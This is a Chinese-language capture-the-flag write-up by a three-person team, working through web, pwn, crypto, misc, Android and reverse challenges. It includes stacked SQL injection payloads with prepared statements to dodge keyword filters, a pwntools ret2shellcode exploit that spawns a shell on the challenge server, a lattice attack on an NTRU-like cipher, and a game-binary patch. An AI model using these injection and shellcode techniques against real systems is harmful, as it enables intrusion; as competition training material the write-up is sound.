---
team: CCCC
members:
    - BC (18) 
    - M@tr1x (18)
    - Akashic以太 (19)
---

## Sign IN
### 1.Starting Point | Author: BC
没啥好说的，进xdsec网站查看源码就拿到flag了...  

## WEb 
### id_wife | Author: BC，Akashic以太
这个题怎么说，好像根据BUUCTF的那个随便注改的吧？之前我也写过那个题的wp.
但最开始没想到堆叠注入，试了挺多方法写脚本跑一下库名表名，最后得到了库名miniL，没跑出来表名,这个就是用二分法不断的尝试 

```sql
id=1') or (ascii(substr(database(),1,1)))<150#
```

后来想起来应该是堆叠注入，得到了俩表user和1145141919810，查看下内容

```sql
id=1') or (ascii(substr(database(),1,1)))<150;show columns from `user`;
id=1') or (ascii(substr(database(),1,1)))<150;show columns from `1145141919810`;
```

然后查看列在1145141919810中看到了content（flag也应该在这里） 
在mysql中支持预编译可以绕过很多种限制，本题中由于可以使用堆叠查询，并且需要使用SELECT关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。  
在sql中我们运用如下语句预编译：

```sql
set @sql=CONCAT('sele','ct content from `1145141919810`');
prepare payload from @sql;
execute payload;
deallocate prepare payload;
```

做到最后一个hint：strstr（）是提示我们大小写的，多试着改几次
```sql
id=1') or (ascii(substr(database(),4,1)))=105;SET @SQL=CONCAT('sele','ct content From `1145141919810`'); PREPARE PAYLOAD FROM @sql;EXECUTE Payload;Deallocate prePare payload;Show Columns From `1145141919810` ;#
```
然后就可以拿到flag了（发现怎么还有个假的？？？emmmm）

## Pwn
### hello | Author: M@tr1x
这个题首先放gdb里看看保护

![image-20200517172402454](https://image.hackerjerry.top/mini_l-ctf_wp-19.png)

基本没开。

放ida里反汇编一下

![image-20200517172543052](https://image.hackerjerry.top/mini_l-ctf_wp-20.png)

![image-20200517172505865](https://image.hackerjerry.top/mini_l-ctf_wp-21.png)

可以看到很明显的栈溢出，s只分配了48字节，但允许读入72字节。

能利用的72-48=24字节，所以构造的rop链不能太长，需要利用另一个bd函数中的`jmp rsp`调回到栈上然后执行shellcode。

![image-20200517174831881](https://image.hackerjerry.top/mini_l-ctf_wp-22.png)

>  sp/esp/rsp（16bit/32bit/64bit）栈寄存器---指向栈顶
>
> bp/ebp/rbp 栈基址寄存器---指向栈底
>
> ip/eip/rip 程序指令寄存器---指向下一条待执行指令

综上，此题是一个ret2shellcode的题。从网上找了一个原理图。

**程序的栈是从进程地址空间的高地址向低地址增长的**。但是填充是从低地址向高地址方向。

![image-20200517194756892](https://image.hackerjerry.top/mini_l-ctf_wp-23.png)

![image-20200517180255401](https://image.hackerjerry.top/mini_l-ctf_wp-24.png)

就是先将shellcode压入栈，然后填充垃圾字符，然后放置返回地址，然后在栈中压入新的汇编指令。

我们构造48字节字符串++8字节bd函数地址。

![image-20200517201320081](https://image.hackerjerry.top/mini_l-ctf_wp-25.png)

ret指令进入bd后弹出bd地址，rsp指向栈内储存的rbp的值

bd函数将rbp再push入栈中, 此时rsp再加8，指向被新压入的rbp 

bd函数执行rsp上的指令

在rsp所指向的位置 覆盖上shellcode,改变rsp的值使其指向getshelI的shellcode井再次进行跳转，完成getshell。

exp：

```python
from pwn import *
# sh = process('./hello')
sh = remote('pwn.challenge.mini.lctf.online', 10008)
context.arch = 'amd64'
context.endian = 'little'
# context.terminal = ['zsh','-c']
# gdb.attach(sh)
jrsp = 0x4006ca
payload = flat(asm(shellcraft.sh()).ljust(0x30+0x8,'a'),jrsp,asm('sub rsp,64')+asm('jmp rsp'))

sh.sendlineafter('What\'s your name?',payload)
sh.interactive() 
```


## Crypto
### ιIl | Author: BC
```python
from Crypto.Util.number import *
q=getPrime(1024)
f=getPrime(511)
g=getPrime(511)
while g>pow(q/4,0.5) and g<pow(q/2,0.5):
	g=getPrime(511)
f_inv_q=inverse(f,q)
h=f_inv_q*g%q
m=bytes_to_long(b'flag')#flag=flag.itself
r=getPrime(510)
e=(r*h+m)%q
print q
print h
print e
```
是关于非对称密码算法NTRUEncrypt的题目,由于知识水平有限，（只见过RSA的）  
大脑对格相关的密码算法的了解一片空白，原理没太懂，但代码记下来了....    
巅峰极客线上赛的一个wp：https://xz.aliyun.com/t/7163#toc-2  

我记直接把代码放上吧
```python
#segemath
p = 126982824744410328945797087760338772632266265605499464155168564006938381164343998332297867219509875837758518332737386292044402913405044815273140449332476472286262639891581209911570020757347401235079120185293696746139599783586620242086604902725583996821566303642800016358224555557587702599076109172899781757727
h = 31497596336552470100084187834926304075869321337353584228754801815485197854209104578876574798202880445492465226847681886628987815101276129299179423009194336979092146458547058477361338454307308727787100367492619524471399054846173175096003547542362283035506046981301967777510149938655352986115892410982908002343
c = 81425203325802096867547935279460713507554656326547202848965764201702208123530941439525435560101593619326780304160780819803407105746324025686271927329740552019112604285594877520543558401049557343346169993751022158349472011774064975266164948244263318723437203684336095564838792724505516573209588002889586264735

# Construct lattice.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);

# Solve SVP.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);
shortest_vector = m.LLL()[0]
f, g = shortest_vector
print(f, g)

# Decrypt.
a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(hex(m))
```

### f**k&base | Author: BC
这个和上个题完全一样啊，我也不知道为什么出两道一样的题  
现根据给出的q，f，g解出h，然后用上面代码即可。

![](https://image.hackerjerry.top/mini_LCTF-9.png)

```python
from Crypto.Util.number import *
q=172620634756442326936446284386446310176482010539257694929884002472846127607264743380697653537447369089693337723649017402105400257863085638725058903969478143249108126132543502414741890867122949021941524916405444824353100158506448429871964258931750339247018885114052623963451658829116065142400435131369957050799
f=4685394431238242086047454699939574117865082734421802876855769683954689809016908045500281898911462887906190042764753834184270447603004244910544167081517863
g=5326402554595682620065287001809742915798424911036766723537742672943459577709829465021452623299712724999868094408519004699993233519540500859134358256211397
f_inv_q=inverse(f,q)
h=f_inv_q*g%q
print(h)
```

然后就得到flag了....
```python
#segemath
p = 
h = 
c = 

# Construct lattice.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);

# Solve SVP.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);
shortest_vector = m.LLL()[0]
f, g = shortest_vector
print(f, g)

# Decrypt.
a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(hex(m))
```

最后记得转化为字符串再提交

## MISC
### MiniGameHacking  | Author: BC
这个游戏还比较有意思，题目不难，打开发现是是一个unity3d的游戏，破解很容易搜到教程，我就随便放一个  
Unity游戏逆向及破解方法介绍 ：https://www.52pojie.cn/thread-951398-1-1.html

把assembly-csharp.dll拖出来，拉到dnspy中。去找相关的类（方法多种多样）  
我想的就是找到Boss的伤害，然后删掉就行，类似于无敌版。
就找有关的Damage方法,把下面代码注释掉再进游戏即可，通关后拿到flag

```c#
public void OnDamaged()
	{
		if (this.isDead)
		{
			return;
		}
		this.isDead = true;
		Object obj = GameObject.FindGameObjectWithTag("Player");
		Camera.main.SendMessage("ShakeHandler", 10f);
		this.shrinkEffect.SendMessage("PlayEffect");
		this.audioSource.PlayOneShot(this.deathSounds[Random.Range(0, this.deathSounds.Length)]);
		this.damuManager.SendMessage("RestartRound");
		this.bossHealthManager.SendMessage("FullHealth");
		Object.Destroy(obj);
		base.Invoke("RespawnPlayer", 1f);
	}
```
### MITM_0 | Author: M@tr1x，BC
![image-20200517103850346](https://image.hackerjerry.top/mini_l-ctf_wp-1.png)

从题目中我们可以看到MITM，即中间人欺骗，里面提示HTTPS，也就是对应SSL,TLS中间人攻击。

打开wireshark分析流量。

![image-20200517104447197](https://image.hackerjerry.top/mini_l-ctf_wp-2.png)

由于中间人攻击首先进行arp欺骗

> **ARP（Address Resolution Protocol）即地址解析协议，** 用于实现从 IP 地址到 MAC 地址的映射，即询问目标IP对应的MAC地址。局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个[ARP欺骗](https://baike.baidu.com/item/ARP欺骗)。

我们过滤一下arp协议的包发现有两个vm，（tplink发出的广播里114的地址经wq师傅提示得知其实是干扰包），点进去看

![image-20200517104701550](https://image.hackerjerry.top/mini_l-ctf_wp-3.png)

记住这两个mac对应的ip地址。

目前我们还确定不了谁是攻击者，因为我们不知道wireshark在哪里记录的流量,而且我感觉这里的数据包并不合理，不应该只有单向arp。

紧接着就是对ssl协议与http协议进行过滤（因为有两种对抗https的中间人攻击，一个是伪造证书，一个是降https为http）

发现http协议的包并不多，因此排除第二种攻击，锁定攻击者手法为第一种。

![image-20200517110028516](https://image.hackerjerry.top/mini_l-ctf_wp-4.png)

随便截取一段，发现ip存在192.168.1.152的数据包非常多，而且发现一个很有趣的现象，所有http包中都存在该地址

![image-20200517110341403](https://image.hackerjerry.top/mini_l-ctf_wp-5.png)

![image-20200517110353189](https://image.hackerjerry.top/mini_l-ctf_wp-6.png)

随便点进去一个

![image-20200517110824934](https://image.hackerjerry.top/mini_l-ctf_wp-7.png)

>  Ethernet II: 数据链路层以太网帧头部信息
>
>  Internet Protocol Version 4: 互联网层IP包头部信息

我们再回到之前的arp包中，仔细看一下info里是什么``192.168.1.1 is at 00:0c:29:3b:d3:41`，这时候就需要计算机网络协议的知识了。

什么是arp,其实就是一个问谁有x.x.x.x这个地址告诉y.y.y.y，一个答x.x.x.x在z:z:z:z:z:z。

我们现在考滤这样一个场景：x.x.x.x要向y.y.y.y的http服务发起访问，ip地址和端口都是很明确的所以ip头和tcp头构造没有问题，那如何获取Mac地址构造Eth头呢？整个流程是这样：x.x.x.x主机先看y.y.y.y是否是同子网ip，不同子网则查找本地MAC地址表中是否有网关ip对应的MAC地址，有则直接使用没有则对网关ip发起ARP；同子网则查找本地MAC地址表中是否有y.y.y.y对应的MAC地址，有则直接使用没有则对y.y.y.y发起ARP。ARP查看本地MAC地址表中是否有给定的ip对应的mac地址，有则向该MAC地址发送ARP查询包，没有则向ff:ff:ff:ff:ff:ff广播ARP查询包。

在本例中则为谁有192.168.1.1告诉192.168.1.152，也就是152在之前应该就发送过arp，而下面tplink发送的广播询问的是谁有192.168.1.114告诉192.168.1.1，可以判断192.168.1.1为网关，而剩下的192.168.1.152则为攻击者。

### MITM_1 | Author: M@tr1x，BC
![image-20200517115549709](https://image.hackerjerry.top/mini_l-ctf_wp-8.png)



这个common name我其实一开始是不知道啥意思的，傻乎乎的理解成了“通常的名字”，然后好一顿查百科，各种试，都不对。后来在与wq师傅交流，给了我一个Hint：CA,CN，证书，又是证书，那么ssl攻击石锤了，那CN是啥呢？

随便点进去一个包含CA的ssl包

![image-20200517120111241](https://image.hackerjerry.top/mini_l-ctf_wp-9.png)

注意到有几项

```
id-at-commonName=webssl.chinanetcenter.com,

id-at-organizationalUnitName=IT,

id-at-organizationName=\347\275\221\345\256\277\347\247\221\346,

id-at-localityName=\345\216\246\35
```

第一项就是我们要找的common name 啦，

> 简称：CN 字段，对于 SSL 证书，一般为网站域名；而对于代码签名证书则为申请单位名称；而对于客户端证书则为证书申请者的姓名；

但是！注意，fake issuer也是题目的要求，而不是一个无意义的词哦。

下面学习TLS证书格式。

![image-20200517122333529](https://image.hackerjerry.top/mini_l-ctf_wp-10.png)

其中 `Certificate issuer` 是证书的签发者，issuer 字段的内容是一组符合 X.500 规范的DN（Distinguished Name）：

```text
Issuer: C=US, ST=Arizona, L=Scottsdale, O=GoDaddy.com, Inc., OU=http://certs.godaddy.com/repository/, CN=Go Daddy Secure Certificate Authority - G2
```

![image-20200517122510583](https://image.hackerjerry.top/mini_l-ctf_wp-11.png)

证书里的 `Subject's Name` 也是一组 DN，它表示证书的拥有者。

我们继续筛选，地址包含攻击者，且协议为ssl的包，而且里面包含CA证书

![](https://image.hackerjerry.top/mini_l-ctf_wp-12.png)

ssl包中CA内有一个issuer字段，经过对比发现所有的ssl中都是它，那么提交一下，正确。

### MITM_2 | Author: M@tr1x

![image-20200517123020637](https://image.hackerjerry.top/mini_l-ctf_wp-13.png)

题目中说，没有从受害者ip发送到攻击者ip的包。这很反直觉，按理说中间人攻击必须要有双方的流量才能攻击成功啊，那么是什么原因造成的呢？

记得福尔摩斯对华生说：“当你排除一切不可能的情况，剩下的，不管多难以置信，那都是事实。”

我们有理由相信，是记录流量的wireshark出了问题。

那么是什么问题呢？

还是感谢wq学长的提示，wireshark记录ip并没有对比其中的mac地址，这就造成了它记录到的ip并不是真实的ip。

在这里，受害者ip被解释成了攻击者ip，其中标号25和26的数据包中

![image-20200517125643280](https://image.hackerjerry.top/mini_l-ctf_wp-14.png)

![image-20200517125705409](https://image.hackerjerry.top/mini_l-ctf_wp-15.png)

![image-20200517125726382](https://image.hackerjerry.top/mini_l-ctf_wp-16.png)

![image-20200517125739961](https://image.hackerjerry.top/mini_l-ctf_wp-17.png)

 一个src ip是192.168.1.151一个dst ip是13.226.113.33，但是mac地址都是d3:41，这说明其实这时记录到的数据包是攻击者伪装ip的数据包，而wireshark并没有对此检验，对比最上面arp协议的包，发现192.168.1.1的mac地址也是d3:41，因此使用ip过滤规则会发现没有受害者向攻击者发送的数据包（如果有的话，就会造成成eth.scr==eth.dst），换一款用mac来标识ip的流量包观察工具就会报错。

最后，通过分析工具找到一个ip和域名（与出题人有关所以要留意一点），这个是wireshark服务端所在地址。但貌似mac地址(d3:41)和攻击者的mac也是一样的，大概也被arp欺骗了吧？

![image-20200517163738960](https://image.hackerjerry.top/mini_l-ctf_wp-18.png)

> 解释到最后我感觉貌似第一题flag给错了，192.168.1.151才是攻击者……因为原题答案是wireshark服务端安在了中间人mac地址上，但是不太好意思再问了…但整体思路应该没有问题，协议题其实还是应该先踏踏实实学好计网，然后上手实验才能出真知啊。


## Android
### TestOnly？| Author: BC
首先看其中的内容
直接对其逆向

![](https://image.hackerjerry.top/mini_LCTF-2.png)

直接将其反编译成java代码，检查代码，并对java代码做审计，能够看见其将一串字符串做了sha1
```java
try
    {
      String str = b("B08020D0FACFDAF81DB46890E4040EDBB8613DA5ABF038F8B86BD44525D2E27B26E22ACD06388112D8467FD688C79CC7EA83F27440577350E8168C2560368616");
      localObject = str;
    }
```
取得其sha1之后的  
33d40461bb5dc676ac72cfdd51f68bc5f88668c7  

如下是一串字符串
![](https://image.hackerjerry.top/mini_LCTF-1.png)  
其会对这个字符串和sha1之后的每一个字符做异或

```python
array=
[85,95,5,83,75,96,94,0,17,61,102,87,80,123,4,105,85,83,101,109,55,85,23,48,106,1
,40,7,97,31]
str1='33d40461bb5dc676ac72cfdd51f68bc5f88668c7'
new_flag=''
for i in range(len(array)):
new_flag+=chr(array[i]^ord(str1[i]))
print(new_flag)
```



## Reverse
### EasyRe| Author: BC,M@tr1x
我们直接看代码很迷，挺复杂

直接通过od来一个一个查出来
![re4](https://image.hackerjerry.top/mini_LCTF-5.png)

![re5](https://image.hackerjerry.top/mini_LCTF-6.png)

minil{easyre's_easy}

### Virtualization| Author: BC，M@tr1x

![vi1](https://image.hackerjerry.top/mini_LCTF-7.png)
先看下程序大概是干啥，之后我们快速定位到对应的函数

![vi2](https://image.hackerjerry.top/mini_LCTF-8.png)
其中有很多函数不知道其功能，通过使用od调试的时候来猜它是什么运算。

之后根据算法，总共有三次循环，每次循环的功能基本一样，针对一个循环做分析

![vi3](https://image.hackerjerry.top/mini_LCTF-10.png)

将自身的字符串与40624的6字节数组做异或操作，当v7大于6的时候，v7=0，然后再将异或后的字符和406050中的数组作比较，如果正确则通过，不正确，v11=0，错误。

```python
arr1=[1,1,2,3,5,8,0xd,0x15,0x22]
arr2='020408'
arr3='02040802040802040802040802040802'
arr4=[0x7d,0x5b,0x5e,0x5d,0x7c,0x7b]
arr5=[0x64,0x74,0x4b,0x63,0x58,0x78,0x44,0x6d,0x59,0x67,0x6f,0x4e,0x59]
arr6=[0x40,0x44,0x5d,0x70,0x54,0x59,0x48,0x70,0x40,0x59,0x77,0x5e,0x4f]
flag=''
for i in range(6):
    flag+=chr(arr4[i]^ord(arr2[i]))
j=0
for i in range(13):
    j=j%6
    flag+=chr(ord(arr2[j])^arr5[i])
    j+=1
j=1
for i in range(13):
    j=j%6
    flag+=chr(ord(arr2[j])^arr6[i])
    j+=1
print(flag)
```
